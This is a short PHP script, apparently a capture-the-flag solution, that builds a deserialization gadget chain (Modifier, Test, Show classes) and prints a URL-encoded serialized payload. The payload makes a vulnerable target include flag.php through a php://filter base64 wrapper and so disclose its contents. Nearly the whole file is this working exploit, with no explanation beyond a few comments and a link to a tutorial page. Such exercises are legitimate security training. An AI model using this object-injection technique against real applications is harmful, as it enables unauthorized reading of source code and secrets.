<?php
//flag is in flag.php
//WTF IS THIS?
//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95
//And Crack It!
class Modifier {
    protected  $var;
    public function __construct(){
        $this->var = "php://filter/convert.base64-encode/resource=flag.php";

    }

}

class Show{
    public $source;
    public $str;
    public function __construct($file='index.php'){
        $this->source = $file;
        //echo 'Welcome to '.$this->source."<br>";
    }

}

class Test{
    public $p;
    public function __construct(){
        $this->p = array();
    }


}

$b = new Modifier();

$a = new Test();
$a->p = $b;
$c = new Show();
$c->str = $a;
$d = new Show($c);
echo urlencode(serialize($d));
//include("php://filter/convert.base64-encode/resource=flag.php");